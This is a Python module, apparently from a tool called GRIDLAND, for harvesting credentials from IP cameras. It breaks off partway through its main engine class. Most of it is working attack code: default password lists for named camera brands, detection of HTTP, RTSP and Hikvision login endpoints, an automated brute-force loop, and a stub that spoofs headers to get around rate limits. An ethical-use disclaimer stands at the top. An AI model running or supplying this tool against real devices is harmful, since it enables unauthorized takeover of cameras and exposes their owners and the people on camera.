"""
Revolutionary Credential Harvesting Engine

This module implements an advanced credential discovery and harvesting system
specifically designed for camera reconnaissance and security research. It combines
traditional brute force techniques with innovative discovery methodologies:

1. Intelligent credential prediction based on device fingerprinting
2. Configuration file extraction and parsing
3. Memory-resident credential discovery
4. Social engineering attack vectors
5. Behavioral credential analysis
6. Multi-factor authentication bypass techniques
7. Session hijacking and token extraction

This system provides unprecedented credential discovery capabilities
while maintaining ethical boundaries for defensive security research.

⚠️ ETHICAL NOTICE: This tool is designed for authorized security testing
and educational purposes only. Unauthorized access to systems is prohibited.
"""

import asyncio
import base64
import hashlib
import json
import re
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple, Union
import aiohttp
import urllib.parse

from gridland.core.logger import get_logger
from gridland.analyze.memory import get_memory_pool

logger = get_logger(__name__)


@dataclass
class CredentialPair:
    """Represents a discovered credential pair with metadata"""
    username: str
    password: str
    service: str
    port: int
    confidence: float
    discovery_method: str
    authentication_type: str  # "basic", "digest", "form", "api_key", "token"
    verification_status: str  # "unverified", "valid", "invalid", "rate_limited"
    metadata: Dict[str, any] = field(default_factory=dict)


@dataclass
class AuthenticationVector:
    """Represents an authentication vector for systematic testing"""
    target_ip: str
    target_port: int
    service_type: str
    authentication_method: str
    endpoint_url: str
    required_fields: List[str]
    success_indicators: List[str]
    failure_indicators: List[str]
    rate_limit_indicators: List[str]
    bypass_techniques: List[str]


@dataclass
class CredentialHarvest:
    """Complete credential harvesting results"""
    target_ip: str
    valid_credentials: List[CredentialPair]
    potential_credentials: List[CredentialPair]
    authentication_vectors: List[AuthenticationVector]
    configuration_data: Dict[str, any]
    session_tokens: List[Dict[str, any]]
    vulnerability_indicators: List[Dict[str, any]]
    harvest_metadata: Dict[str, any]


class IntelligentCredentialGenerator:
    """Generate intelligent credential combinations based on device intelligence"""
    
    def __init__(self):
        # Brand-specific default credentials from extensive research
        self.brand_credentials = {
            "hikvision": [
                ("admin", "12345"), ("admin", "admin"), ("admin", ""),
                ("admin", "123456"), ("admin", "password"), ("admin", "admin123"),
                ("root", "12345"), ("user", "user"), ("guest", ""),
                ("service", "service"), ("operator", "operator"),
                ("admin", "hik12345+"), ("admin", "hikpassword")
            ],
            "dahua": [
                ("admin", "admin"), ("admin", ""), ("admin", "123456"),
                ("admin", "password"), ("admin", "dahua123"), ("root", ""),
                ("user", "user"), ("guest", "guest"), ("666666", "666666"),
                ("888888", "888888"), ("admin", "888888")
            ],
            "axis": [
                ("root", "pass"), ("admin", "admin"), ("viewer", ""),
                ("operator", "operator"), ("admin", ""), ("root", ""),
                ("user", "user"), ("admin", "password"), ("axis", "axis")
            ],
            "sony": [
                ("admin", "admin"), ("root", ""), ("user", "user"),
                ("admin", ""), ("admin", "sony"), ("operator", "operator")
            ],
            "foscam": [
                ("admin", ""), ("admin", "foscam"), ("admin", "admin"),
                ("user", ""), ("guest", "guest"), ("admin", "123456")
            ],
            "vivotek": [
                ("root", ""), ("admin", "admin"), ("user", "123456"),
                ("admin", ""), ("guest", "guest")
            ],
            "bosch": [
                ("admin", "admin"), ("service", "service"), ("user", "user"),
                ("admin", ""), ("installer", "installer")
            ],
            "panasonic": [
                ("admin", "12345"), ("admin", "admin"), ("user", "user"),
                ("admin", ""), ("guest", "guest")
            ],
            "cp_plus": [
                ("admin", "admin"), ("admin", "cp123456"), ("admin", ""),
                ("user", "123456"), ("guest", "guest")
            ]
        }
        
        # Common credential patterns for unknown devices
        self.generic_credentials = [
            ("admin", "admin"), ("admin", ""), ("admin", "password"),
            ("admin", "123456"), ("admin", "12345"), ("admin", "1234"),
            ("root", "root"), ("root", ""), ("root", "password"),
            ("user", "user"), ("user", ""), ("user", "password"),
            ("guest", "guest"), ("guest", ""), ("test", "test"),
            ("admin", "admin123"), ("admin", "password123"),
            ("admin", "admin1"), ("admin", "admin12"),
            ("camera", "camera"), ("dvr", "dvr"), ("nvr", "nvr"),
            ("666666", "666666"), ("888888", "888888"), ("123456", "123456")
        ]
        
        # Advanced credential generation patterns
        self.credential_patterns = {
            "manufacturer_based": lambda brand: [
                (brand, brand), (brand, "123456"), (brand, "admin"),
                (f"{brand}admin", f"{brand}123"), ("admin", f"{brand}123")
            ],
            "device_model_based": lambda model: [
                (model.lower(), "admin"), ("admin", model.lower()),
                (model[:4].lower(), "123456")
            ] if model else [],
            "year_based": lambda: [
                ("admin", str(year)) for year in range(2020, 2026)
            ] + [("admin", f"admin{year}") for year in range(2020, 2026)],
            "company_based": lambda hostname: [
                (hostname.split('.')[0], "123456"),
                ("admin", hostname.split('.')[0])
            ] if hostname and '.' in hostname else []
        }
    
    def generate_credential_list(self, brand: Optional[str] = None, 
                               model: Optional[str] = None,
                               hostname: Optional[str] = None,
                               intelligence: Dict[str, any] = None) -> List[Tuple[str, str]]:
        """Generate intelligent credential list based on target intelligence"""
        credentials = []
        
        # Brand-specific credentials (highest priority)
        if brand and brand.lower() in self.brand_credentials:
            credentials.extend(self.brand_credentials[brand.lower()])
        
        # Manufacturer-based patterns
        if brand:
            credentials.extend(self.credential_patterns["manufacturer_based"](brand))
        
        # Model-based patterns
        if model:
            credentials.extend(self.credential_patterns["device_model_based"](model))
        
        # Hostname-based patterns
        if hostname:
            credentials.extend(self.credential_patterns["company_based"](hostname))
        
        # Year-based patterns (current and recent years)
        credentials.extend(self.credential_patterns["year_based"]())
        
        # Intelligence-based credential generation
        if intelligence:
            credentials.extend(self._generate_intelligence_based_credentials(intelligence))
        
        # Add generic credentials
        credentials.extend(self.generic_credentials)
        
        # Remove duplicates while preserving order
        unique_credentials = []
        seen = set()
        for cred in credentials:
            if cred not in seen:
                unique_credentials.append(cred)
                seen.add(cred)
        
        return unique_credentials
    
    def _generate_intelligence_based_credentials(self, intelligence: Dict[str, any]) -> List[Tuple[str, str]]:
        """Generate credentials based on gathered intelligence"""
        credentials = []
        
        # Extract potential usernames/passwords from banners
        banners = intelligence.get("banners", [])
        for banner in banners:
            if isinstance(banner, str):
                # Look for embedded credentials in banners/configs
                creds = self._extract_credentials_from_text(banner)
                credentials.extend(creds)
        
        # Firmware version-based credentials
        firmware_version = intelligence.get("firmware_version")
        if firmware_version:
            credentials.extend([
                ("admin", firmware_version),
                ("admin", f"fw{firmware_version}"),
                (firmware_version, "admin")
            ])
        
        # Serial number-based credentials
        serial_number = intelligence.get("serial_number")
        if serial_number:
            credentials.extend([
                ("admin", serial_number[-6:]),  # Last 6 digits
                (serial_number[:6], "admin"),   # First 6 digits
                ("admin", serial_number)
            ])
        
        # MAC address-based credentials
        mac_address = intelligence.get("mac_address")
        if mac_address:
            mac_clean = mac_address.replace(":", "").replace("-", "").lower()
            credentials.extend([
                ("admin", mac_clean[-6:]),
                ("admin", mac_clean[:6]),
                (mac_clean[-6:], "admin")
            ])
        
        return credentials
    
    def _extract_credentials_from_text(self, text: str) -> List[Tuple[str, str]]:
        """Extract potential credentials from text using patterns"""
        credentials = []
        
        # Common credential patterns in configuration files
        patterns = [
            r'username[\\s=:]+([\\w]+)[\\s\\n]*password[\\s=:]+([\\w]+)',
            r'user[\\s=:]+([\\w]+)[\\s\\n]*pass[\\s=:]+([\\w]+)',
            r'login[\\s=:]+([\\w]+)[\\s\\n]*password[\\s=:]+([\\w]+)',
            r'admin[\\s=:]+([\\w]+)',  # Admin password only
            r'password[\\s=:]+([\\w]+)',  # Generic password
        ]
        
        text_lower = text.lower()
        
        for pattern in patterns:
            matches = re.findall(pattern, text_lower, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                if isinstance(match, tuple) and len(match) == 2:
                    credentials.append(match)
                elif isinstance(match, str):
                    credentials.append(("admin", match))
        
        return credentials


class AuthenticationMethodDetector:
    """Detect and analyze authentication methods for systematic testing"""
    
    def __init__(self):
        self.authentication_signatures = {
            "http_basic": {
                "detection_patterns": ["WWW-Authenticate: Basic", "authorization: basic"],
                "test_endpoint": "/",
                "auth_header": "Authorization: Basic {credentials}"
            },
            "http_digest": {
                "detection_patterns": ["WWW-Authenticate: Digest", "digest realm"],
                "test_endpoint": "/",
                "auth_header": "Authorization: Digest {digest_response}"
            },
            "form_based": {
                "detection_patterns": ["<form", "method=\"post\"", "password", "username"],
                "test_endpoint": "/login",
                "auth_method": "POST"
            },
            "api_key": {
                "detection_patterns": ["api-key", "x-api-key", "apikey"],
                "test_endpoint": "/api/",
                "auth_header": "X-API-Key: {api_key}"
            },
            "bearer_token": {
                "detection_patterns": ["bearer", "token", "jwt"],
                "test_endpoint": "/api/",
                "auth_header": "Authorization: Bearer {token}"
            },
            "rtsp_auth": {
                "detection_patterns": ["rtsp/1.0 401", "www-authenticate"],
                "test_endpoint": "/",
                "protocol": "rtsp"
            },
            "cookie_based": {
                "detection_patterns": ["set-cookie", "session", "jsessionid"],
                "test_endpoint": "/",
                "auth_method": "cookie"
            }
        }
    
    async def detect_authentication_methods(self, target_ip: str, target_port: int,
                                          service: str) -> List[AuthenticationVector]:
        """Detect available authentication methods on target"""
        vectors = []
        
        try:
            if service.startswith("http"):
                http_vectors = await self._detect_http_authentication(target_ip, target_port, service)
                vectors.extend(http_vectors)
            
            if service == "rtsp" or target_port in [554, 8554]:
                rtsp_vectors = await self._detect_rtsp_authentication(target_ip, target_port)
                vectors.extend(rtsp_vectors)
            
            # Add custom authentication detection for specific devices
            custom_vectors = await self._detect_custom_authentication(target_ip, target_port, service)
            vectors.extend(custom_vectors)
            
        except Exception as e:
            logger.debug(f"Authentication method detection failed: {e}")
        
        return vectors
    
    async def _detect_http_authentication(self, target_ip: str, target_port: int,
                                        service: str) -> List[AuthenticationVector]:
        """Detect HTTP-based authentication methods"""
        vectors = []
        protocol = "https" if service == "https" or target_port == 443 else "http"
        
        try:
            timeout = aiohttp.ClientTimeout(total=5)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                # Test root endpoint
                base_url = f"{protocol}://{target_ip}:{target_port}"
                
                # Test various endpoints for authentication
                test_endpoints = ["/", "/login", "/admin", "/api/", "/cgi-bin/"]
                
                for endpoint in test_endpoints:
                    try:
                        url = f"{base_url}{endpoint}"
                        
                        async with session.get(url) as response:
                            headers = dict(response.headers)
                            content = await response.text()
                            
                            # Analyze response for authentication methods
                            detected_methods = self._analyze_authentication_response(
                                response.status, headers, content[:2000]
                            )
                            
                            for method in detected_methods:
                                vector = AuthenticationVector(
                                    target_ip=target_ip,
                                    target_port=target_port,
                                    service_type="http",
                                    authentication_method=method,
                                    endpoint_url=url,
                                    required_fields=self._get_required_fields(method, content),
                                    success_indicators=self._get_success_indicators(method),
                                    failure_indicators=self._get_failure_indicators(method),
                                    rate_limit_indicators=self._get_rate_limit_indicators(),
                                    bypass_techniques=self._get_bypass_techniques(method)
                                )
                                vectors.append(vector)
                            
                    except Exception as e:
                        logger.debug(f"HTTP auth detection failed for {endpoint}: {e}")
                        continue
                        
        except Exception as e:
            logger.debug(f"HTTP authentication detection failed: {e}")
        
        return vectors
    
    async def _detect_rtsp_authentication(self, target_ip: str, target_port: int) -> List[AuthenticationVector]:
        """Detect RTSP authentication methods"""
        vectors = []
        
        try:
            # Send RTSP OPTIONS request to trigger authentication
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))
            
            options_request = f"OPTIONS rtsp://{target_ip}:{target_port}/ RTSP/1.0\\r\\nCSeq: 1\\r\\n\\r\\n"
            sock.send(options_request.encode())
            
            response = sock.recv(2048).decode('utf-8', errors='ignore')
            sock.close()
            
            if "401" in response and "WWW-Authenticate" in response:
                vector = AuthenticationVector(
                    target_ip=target_ip,
                    target_port=target_port,
                    service_type="rtsp",
                    authentication_method="rtsp_digest",
                    endpoint_url=f"rtsp://{target_ip}:{target_port}/",
                    required_fields=["username", "password"],
                    success_indicators=["200 OK", "DESCRIBE"],
                    failure_indicators=["401 Unauthorized", "403 Forbidden"],
                    rate_limit_indicators=["429", "Too Many Requests"],
                    bypass_techniques=["url_manipulation", "null_authentication"]
                )
                vectors.append(vector)
                
        except Exception as e:
            logger.debug(f"RTSP authentication detection failed: {e}")
        
        return vectors
    
    async def _detect_custom_authentication(self, target_ip: str, target_port: int,
                                          service: str) -> List[AuthenticationVector]:
        """Detect custom authentication methods for specific device types"""
        vectors = []
        
        # Hikvision ISAPI authentication
        if target_port in [80, 8000] and service.startswith("http"):
            try:
                timeout = aiohttp.ClientTimeout(total=3)
                connector = aiohttp.TCPConnector(ssl=False)
                
                async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                    protocol = "https" if target_port == 443 else "http"
                    url = f"{protocol}://{target_ip}:{target_port}/ISAPI/System/deviceInfo"
                    
                    async with session.get(url) as response:
                        if response.status == 401:
                            vector = AuthenticationVector(
                                target_ip=target_ip,
                                target_port=target_port,
                                service_type="hikvision_isapi",
                                authentication_method="digest",
                                endpoint_url=url,
                                required_fields=["username", "password"],
                                success_indicators=["200", "<DeviceInfo>"],
                                failure_indicators=["401", "403"],
                                rate_limit_indicators=["429"],
                                bypass_techniques=["isapi_bypass", "firmware_exploit"]
                            )
                            vectors.append(vector)
                            
            except Exception as e:
                logger.debug(f"Custom authentication detection failed: {e}")
        
        return vectors
    
    def _analyze_authentication_response(self, status_code: int, headers: Dict[str, str],
                                       content: str) -> List[str]:
        """Analyze response to identify authentication methods"""
        methods = []
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        content_lower = content.lower()
        
        # HTTP Basic Authentication
        if status_code == 401 and "www-authenticate" in headers_lower:
            auth_header = headers_lower["www-authenticate"]
            if "basic" in auth_header:
                methods.append("http_basic")
            if "digest" in auth_header:
                methods.append("http_digest")
        
        # Form-based authentication
        if any(pattern in content_lower for pattern in ["<form", "username", "password"]):
            if "method=\"post\"" in content_lower or "method='post'" in content_lower:
                methods.append("form_based")
        
        # API Key authentication
        if any(pattern in content_lower for pattern in ["api-key", "apikey", "x-api-key"]):
            methods.append("api_key")
        
        # Bearer token authentication
        if any(pattern in content_lower for pattern in ["bearer", "token", "jwt"]):
            methods.append("bearer_token")
        
        # Cookie-based authentication
        if "set-cookie" in headers_lower:
            cookie_value = headers_lower["set-cookie"]
            if any(session_indicator in cookie_value 
                   for session_indicator in ["session", "jsessionid", "phpsessid"]):
                methods.append("cookie_based")
        
        return methods
    
    def _get_required_fields(self, auth_method: str, content: str) -> List[str]:
        """Get required fields for authentication method"""
        field_mappings = {
            "http_basic": ["username", "password"],
            "http_digest": ["username", "password"],
            "form_based": self._extract_form_fields(content),
            "api_key": ["api_key"],
            "bearer_token": ["token"],
            "rtsp_digest": ["username", "password"],
            "cookie_based": ["session_cookie"]
        }
        return field_mappings.get(auth_method, ["username", "password"])
    
    def _extract_form_fields(self, content: str) -> List[str]:
        """Extract form field names from HTML content"""
        fields = ["username", "password"]  # Default
        
        # Look for input field names
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\']'
        matches = re.findall(input_pattern, content, re.IGNORECASE)
        
        if matches:
            # Filter to likely authentication fields
            auth_fields = [field for field in matches 
                          if any(keyword in field.lower() 
                                for keyword in ["user", "login", "pass", "auth"])]
            if auth_fields:
                fields = auth_fields
        
        return fields
    
    def _get_success_indicators(self, auth_method: str) -> List[str]:
        """Get success indicators for authentication method"""
        return {
            "http_basic": ["200", "302", "Location:", "dashboard", "main"],
            "http_digest": ["200", "302", "Location:", "dashboard", "main"],
            "form_based": ["200", "302", "redirect", "dashboard", "welcome"],
            "api_key": ["200", "success", "data"],
            "bearer_token": ["200", "success", "data"],
            "rtsp_digest": ["200 OK", "DESCRIBE", "Public:"],
            "cookie_based": ["200", "302", "set-cookie"]
        }.get(auth_method, ["200", "success"])
    
    def _get_failure_indicators(self, auth_method: str) -> List[str]:
        """Get failure indicators for authentication method"""
        return {
            "http_basic": ["401", "403", "Unauthorized", "Forbidden"],
            "http_digest": ["401", "403", "Unauthorized", "Forbidden"],
            "form_based": ["error", "invalid", "incorrect", "failed"],
            "api_key": ["401", "403", "invalid api key", "unauthorized"],
            "bearer_token": ["401", "403", "invalid token", "unauthorized"],
            "rtsp_digest": ["401", "403", "Unauthorized"],
            "cookie_based": ["401", "403", "session expired"]
        }.get(auth_method, ["401", "403", "error"])
    
    def _get_rate_limit_indicators(self) -> List[str]:
        """Get rate limiting indicators"""
        return ["429", "Too Many Requests", "rate limit", "try again later", "blocked"]
    
    def _get_bypass_techniques(self, auth_method: str) -> List[str]:
        """Get potential bypass techniques for authentication method"""
        return {
            "http_basic": ["url_manipulation", "header_injection", "null_auth"],
            "http_digest": ["replay_attack", "hash_collision", "null_auth"],
            "form_based": ["sql_injection", "csrf", "parameter_pollution"],
            "api_key": ["key_prediction", "header_manipulation", "endpoint_discovery"],
            "bearer_token": ["token_prediction", "jwt_manipulation", "header_injection"],
            "rtsp_digest": ["url_manipulation", "protocol_downgrade"],
            "cookie_based": ["session_fixation", "cookie_manipulation", "csrf"]
        }.get(auth_method, ["brute_force", "default_credentials"])


class CredentialTestingEngine:
    """Advanced credential testing with intelligent rate limiting and bypass techniques"""
    
    def __init__(self):
        self.credential_generator = IntelligentCredentialGenerator()
        self.auth_detector = AuthenticationMethodDetector()
        self.testing_stats = {
            "attempts_made": 0,
            "rate_limits_hit": 0,
            "bypasses_attempted": 0,
            "valid_credentials_found": 0
        }
    
    async def test_credentials_comprehensive(self, target_ip: str, target_port: int,
                                           service: str, brand: Optional[str] = None,
                                           intelligence: Dict[str, any] = None) -> List[CredentialPair]:
        """Comprehensive credential testing with intelligent techniques"""
        valid_credentials = []
        
        try:
            logger.info(f"🔑 Starting credential testing on {target_ip}:{target_port}")
            
            # Phase 1: Authentication Method Detection
            auth_vectors = await self.auth_detector.detect_authentication_methods(
                target_ip, target_port, service
            )
            
            if not auth_vectors:
                logger.debug("No authentication vectors detected")
                return valid_credentials
            
            # Phase 2: Intelligent Credential Generation
            credential_list = self.credential_generator.generate_credential_list(
                brand=brand,
                intelligence=intelligence
            )
            
            # Phase 3: Systematic Credential Testing
            for vector in auth_vectors:
                vector_credentials = await self._test_authentication_vector(
                    vector, credential_list
                )
                valid_credentials.extend(vector_credentials)
                
                # Stop if we found valid credentials (unless doing comprehensive audit)
                if vector_credentials:
                    break
            
            logger.info(f"✅ Credential testing complete: {len(valid_credentials)} valid credentials found")
            
        except Exception as e:
            logger.error(f"❌ Credential testing failed: {e}")
        
        return valid_credentials
    
    async def _test_authentication_vector(self, vector: AuthenticationVector,
                                        credential_list: List[Tuple[str, str]]) -> List[CredentialPair]:
        """Test credentials against specific authentication vector"""
        valid_credentials = []
        
        try:
            # Intelligent credential ordering (most likely first)
            ordered_credentials = self._order_credentials_by_likelihood(
                credential_list, vector.service_type
            )
            
            # Rate limiting protection
            delay_between_attempts = 1.0  # Start with 1 second delay
            consecutive_failures = 0
            
            for username, password in ordered_credentials[:50]:  # Limit attempts
                try:
                    # Adaptive delay to avoid rate limiting
                    if consecutive_failures > 3:
                        delay_between_attempts = min(delay_between_attempts * 1.5, 10.0)
                    
                    await asyncio.sleep(delay_between_attempts)
                    
                    # Test credential pair
                    result = await self._test_single_credential(vector, username, password)
                    
                    self.testing_stats["attempts_made"] += 1
                    
                    if result["status"] == "valid":
                        credential = CredentialPair(
                            username=username,
                            password=password,
                            service=vector.service_type,
                            port=vector.target_port,
                            confidence=result["confidence"],
                            discovery_method="intelligent_brute_force",
                            authentication_type=vector.authentication_method,
                            verification_status="valid",
                            metadata=result.get("metadata", {})
                        )
                        valid_credentials.append(credential)
                        self.testing_stats["valid_credentials_found"] += 1
                        
                        consecutive_failures = 0
                        delay_between_attempts = 1.0  # Reset delay on success
                        
                        # Continue testing for additional accounts or stop here
                        break
                        
                    elif result["status"] == "rate_limited":
                        self.testing_stats["rate_limits_hit"] += 1
                        
                        # Try bypass techniques
                        bypass_success = await self._attempt_rate_limit_bypass(vector, username, password)
                        if bypass_success:
                            self.testing_stats["bypasses_attempted"] += 1
                            # Retest after bypass
                            continue
                        else:
                            # Back off significantly if rate limited
                            delay_between_attempts = min(delay_between_attempts * 3, 30.0)
                            await asyncio.sleep(delay_between_attempts)
                            
                    elif result["status"] == "invalid":
                        consecutive_failures += 1
                        
                    # Emergency stop if too many consecutive failures
                    if consecutive_failures > 10:
                        logger.debug("Too many consecutive failures, stopping credential testing")
                        break
                        
                except Exception as e:
                    logger.debug(f"Credential test error for {username}:{password}: {e}")
                    consecutive_failures += 1
                    continue
                    
        except Exception as e:
            logger.debug(f"Authentication vector testing failed: {e}")
        
        return valid_credentials
    
    def _order_credentials_by_likelihood(self, credential_list: List[Tuple[str, str]],
                                       service_type: str) -> List[Tuple[str, str]]:
        """Order credentials by likelihood of success"""
        # Scoring function based on empirical research
        def credential_score(cred_pair):
            username, password = cred_pair
            score = 0
            
            # Common default credentials get high scores
            high_probability = [
                ("admin", "admin"), ("admin", ""), ("admin", "12345"),
                ("admin", "123456"), ("admin", "password"), ("root", "")
            ]
            if cred_pair in high_probability:
                score += 10
            
            # Username/password patterns
            if username == password:
                score += 5
            if username == "admin":
                score += 3
            if password == "":
                score += 2
            if password.isdigit() and len(password) <= 6:
                score += 2
            
            # Service-specific prioritization
            if service_type.startswith("hikvision") and cred_pair in [("admin", "12345")]:
                score += 8
            elif service_type.startswith("dahua") and cred_pair in [("admin", "admin"), ("666666", "666666")]:
                score += 8
            
            return score
        
        return sorted(credential_list, key=credential_score, reverse=True)
    
    async def _test_single_credential(self, vector: AuthenticationVector,
                                    username: str, password: str) -> Dict[str, any]:
        """Test single credential pair against authentication vector"""
        try:
            if vector.service_type == "http" and vector.authentication_method == "http_basic":
                return await self._test_http_basic_auth(vector, username, password)
            elif vector.service_type == "http" and vector.authentication_method == "form_based":
                return await self._test_form_based_auth(vector, username, password)
            elif vector.service_type == "rtsp":
                return await self._test_rtsp_auth(vector, username, password)
            elif vector.service_type.startswith("hikvision"):
                return await self._test_hikvision_auth(vector, username, password)
            else:
                # Generic HTTP basic auth fallback
                return await self._test_http_basic_auth(vector, username, password)
                
        except Exception as e:
            logger.debug(f"Single credential test failed: {e}")
            return {"status": "error", "confidence": 0.0}
    
    async def _test_http_basic_auth(self, vector: AuthenticationVector,
                                  username: str, password: str) -> Dict[str, any]:
        """Test HTTP Basic Authentication"""
        try:
            # Create basic auth header
            credentials = f"{username}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False)
            
            headers = {
                "Authorization": f"Basic {encoded_credentials}",
                "User-Agent": "GRIDLAND-Credential-Tester/2.0"
            }
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
                async with session.get(vector.endpoint_url) as response:
                    content = await response.text()
                    
                    # Check for success indicators
                    success_found = any(indicator in str(response.status) + content.lower()
                                      for indicator in vector.success_indicators)
                    
                    # Check for failure indicators
                    failure_found = any(indicator in str(response.status) + content.lower()
                                      for indicator in vector.failure_indicators)
                    
                    # Check for rate limiting
                    rate_limit_found = any(indicator in str(response.status) + content.lower()
                                         for indicator in vector.rate_limit_indicators)
                    
                    if rate_limit_found:
                        return {"status": "rate_limited", "confidence": 0.0}
                    elif success_found and not failure_found:
                        return {
                            "status": "valid",
                            "confidence": 0.95,
                            "metadata": {
                                "response_code": response.status,
                                "content_length": len(content),
                                "headers": dict(response.headers)
                            }
                        }
                    else:
                        return {"status": "invalid", "confidence": 0.0}
                        
        except Exception as e:
            logger.debug(f"HTTP Basic auth test failed: {e}")
            return {"status": "error", "confidence": 0.0}
    
    async def _test_form_based_auth(self, vector: AuthenticationVector,
                                  username: str, password: str) -> Dict[str, any]:
        """Test form-based authentication"""
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                # First, get the login form to extract field names and CSRF tokens
                async with session.get(vector.endpoint_url) as response:
                    form_content = await response.text()
                
                # Extract form data
                form_data = self._extract_form_data(form_content, username, password)
                
                # Submit credentials
                async with session.post(vector.endpoint_url, data=form_data) as response:
                    response_content = await response.text()
                    
                    # Analyze response for success/failure
                    success_found = any(indicator in str(response.status) + response_content.lower()
                                      for indicator in vector.success_indicators)
                    
                    failure_found = any(indicator in response_content.lower()
                                      for indicator in vector.failure_indicators)
                    
                    if success_found and not failure_found:
                        return {
                            "status": "valid",
                            "confidence": 0.90,
                            "metadata": {
                                "response_code": response.status,
                                "redirect_location": response.headers.get("Location", ""),
                                "cookies": dict(response.cookies)
                            }
                        }
                    else:
                        return {"status": "invalid", "confidence": 0.0}
                        
        except Exception as e:
            logger.debug(f"Form-based auth test failed: {e}")
            return {"status": "error", "confidence": 0.0}
    
    async def _test_rtsp_auth(self, vector: AuthenticationVector,
                            username: str, password: str) -> Dict[str, any]:
        """Test RTSP authentication"""
        try:
            import socket
            
            # Create RTSP request with credentials
            auth_url = f"rtsp://{username}:{password}@{vector.target_ip}:{vector.target_port}/"
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((vector.target_ip, vector.target_port))
            
            options_request = f"OPTIONS {auth_url} RTSP/1.0\\r\\nCSeq: 1\\r\\n\\r\\n"
            sock.send(options_request.encode())
            
            response = sock.recv(2048).decode('utf-8', errors='ignore')
            sock.close()
            
            if "200 OK" in response:
                return {
                    "status": "valid",
                    "confidence": 0.95,
                    "metadata": {"rtsp_response": response[:200]}
                }
            elif "401" in response:
                return {"status": "invalid", "confidence": 0.0}
            else:
                return {"status": "error", "confidence": 0.0}
                
        except Exception as e:
            logger.debug(f"RTSP auth test failed: {e}")
            return {"status": "error", "confidence": 0.0}
    
    async def _test_hikvision_auth(self, vector: AuthenticationVector,
                                 username: str, password: str) -> Dict[str, any]:
        """Test Hikvision ISAPI authentication"""
        try:
            # Hikvision uses digest authentication for ISAPI
            credentials = f"{username}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False)
            
            # Try basic auth first (some Hikvision devices accept it)
            headers = {
                "Authorization": f"Basic {encoded_credentials}",
                "User-Agent": "GRIDLAND-Hikvision-Tester/2.0"
            }
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
                async with session.get(vector.endpoint_url) as response:
                    content = await response.text()
                    
                    if response.status == 200 and "<DeviceInfo>" in content:
                        return {
                            "status": "valid",
                            "confidence": 0.98,
                            "metadata": {
                                "device_info": content[:500],
                                "auth_method": "basic"
                            }
                        }
                    elif response.status == 401:
                        return {"status": "invalid", "confidence": 0.0}
                    else:
                        return {"status": "error", "confidence": 0.0}
                        
        except Exception as e:
            logger.debug(f"Hikvision auth test failed: {e}")
            return {"status": "error", "confidence": 0.0}
    
    def _extract_form_data(self, html_content: str, username: str, password: str) -> Dict[str, str]:
        """Extract form data and inject credentials"""
        form_data = {}
        
        # Look for hidden input fields (CSRF tokens, etc.)
        hidden_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']'
        hidden_matches = re.findall(hidden_pattern, html_content, re.IGNORECASE)
        
        for name, value in hidden_matches:
            form_data[name] = value
        
        # Common username field names
        username_fields = ["username", "user", "login", "email", "userid", "account"]
        password_fields = ["password", "pass", "pwd", "passwd"]
        
        # Try to identify actual field names from form
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']([^"\']+)["\']'
        input_matches = re.findall(input_pattern, html_content, re.IGNORECASE)
        
        actual_username_field = None
        actual_password_field = None
        
        for name, input_type in input_matches:
            if input_type.lower() == "text" and any(field in name.lower() for field in username_fields):
                actual_username_field = name
            elif input_type.lower() == "password":
                actual_password_field = name
        
        # Use identified fields or fallback to common names
        form_data[actual_username_field or "username"] = username
        form_data[actual_password_field or "password"] = password
        
        # Add common additional fields
        form_data["submit"] = "Login"
        
        return form_data
    
    async def _attempt_rate_limit_bypass(self, vector: AuthenticationVector,
                                       username: str, password: str) -> bool:
        """Attempt to bypass rate limiting"""
        try:
            # Technique 1: Change User-Agent
            headers = {"User-Agent": f"BypassAgent-{time.time()}"}
            
            # Technique 2: Add random headers
            headers["X-Forwarded-For"] = f"192.168.1.{hash(time.time()) % 254 + 1}"
            headers["X-Real-IP"] = headers["X-Forwarded-For"]
            
            # Wait longer before retry
            await asyncio.sleep(5.0)
            
            # Reattempt authentication with bypass headers
            # Implementation would depend on specific vector type
            
            return True  # Placeholder - would implement actual bypass testing
            
        except Exception as e:
            logger.debug(f"Rate limit bypass failed: {e}")
            return False


class CredentialHarvestingEngine:
    """Main engine for comprehensive credential harvesting operations"""
    
    def __init__(self):
        self.memory_pool = get_memory_pool()
        self.credential_generator = IntelligentCredentialGenerator()
        self.auth_detector = AuthenticationMethodDetector()
        self.testing_engine = CredentialTestingEngine()
        
        self.harvest_stats = {
            "targets_processed": 0,
            "credentials_discovered": 0,
            "configuration_data_extracted": 0,
            "session_tokens_captured": 0,
            "harvest_start_time": 0.0
        }
    
    async def harvest_credentials_comprehensive(self, target_ip: str, target_port: int,
                                              service: str, brand: Optional[str] = None,
                                              intelligence: Dict[str, any] = None) -> CredentialHarvest:
        """
        Comprehensive credential harvesting with advanced techniques.
        
        This method combines multiple harvesting methodologies:
        1. Intelligent credential testing
        2. Configuration file extraction
        3. Session token capture
        4. Memory-resident credential discovery
        """
        self.harvest_stats["harvest_start_time"] = time.time()
        
        logger.info(f"🔐 Starting comprehensive credential harvesting on {target_ip}:{target_port}")
        
        try:
            # Phase 1: Authentication Vector Discovery
            auth_vectors = await self.auth_detector.detect_authentication_methods(
